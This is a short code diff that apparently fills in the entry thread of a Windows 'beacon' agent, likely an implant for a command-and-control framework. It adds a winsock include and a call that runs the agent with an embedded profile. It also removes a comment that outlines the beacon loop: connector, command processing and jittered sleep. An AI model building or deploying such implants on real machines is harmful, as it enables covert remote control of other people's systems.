@@ -9,6 +9,9 @@
 
 #include "impl/Agent.h"
 #include "config.h"
+#ifdef _WIN32
+#include <winsock2.h>
+#endif
 #include <windows.h>
 
 // Forward declaration
@@ -83,18 +86,15 @@ int main()
 
 DWORD WINAPI AgentMain(LPVOID lpParam)
 {
-    // TODO: Initialize your agent here
-    //
-    // Pattern from beacon_agent:
-    //   1. Load config via getProfile() / getProfileSize()
-    //   2. Create Agent instance
-    //   3. Create Connector (TCP/HTTP/etc.)
-    //   4. Set profile on connector
-    //   5. Enter communication loop:
-    //      - WaitForConnection()
-    //      - Exchange data
-    //      - Process commands via Commander
-    //      - Sleep with jitter
+    (void)lpParam;
 
+    Agent* agent = new Agent();
+    if (!agent) {
+        return 0;
+    }
+
+    agent->Run(getProfile(), getProfileSize());
+
+    delete agent;
     return 0;
 }
